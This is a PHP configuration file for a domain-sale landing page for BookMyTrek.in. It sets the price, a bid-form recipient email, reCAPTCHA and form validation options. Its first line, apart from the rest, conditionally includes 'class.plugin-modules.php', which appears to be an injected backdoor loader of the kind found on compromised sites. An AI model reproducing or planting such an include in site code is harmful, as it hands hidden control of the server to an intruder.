<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
//**********************************************************
// Domain Details
//**********************************************************
define( "DOMAIN_NAME",  "BookMyTrek.in" );
define( "DOMAIN_PRICE", "$1,500 USD"     );

//**********************************************************
// Additional Domains
// Set to the exported list name for additional domains.
// FORMAT: Domains should be one to a line, name only.
//         MyDomain.com
//         MyOtherDomain.com
//**********************************************************
define( "DOMAIN_LIST", "Domain-List.txt" );

//**********************************************************
// GOOGLE Analytics ID
//**********************************************************
define( "GOOGLE_ANALYTICS_ID", "" );

//**********************************************************
// FORM Settings
//**********************************************************
define( "FORM_EMAIL",   "bale.prashant1984@gmail.com"   );
define( "FORM_SUBJECT", "Incoming Domain Bid!" );

// reCAPTCHA Integration
// Signup: http://www.google.com/recaptcha
define( "CAPTCHA_ENABLED",     TRUE );
define( "CAPTCHA_KEY_PUBLIC",  ""    );
define( "CAPTCHA_KEY_PRIVATE", ""    );

// Field Validation
define( "REQUIRED_NAME",    TRUE  );
define( "REQUIRED_EMAIL",   TRUE  );
define( "REQUIRED_PHONE",   FALSE );
define( "REQUIRED_OFFER",   FALSE );
define( "REQUIRED_MESSAGE", FALSE );
?>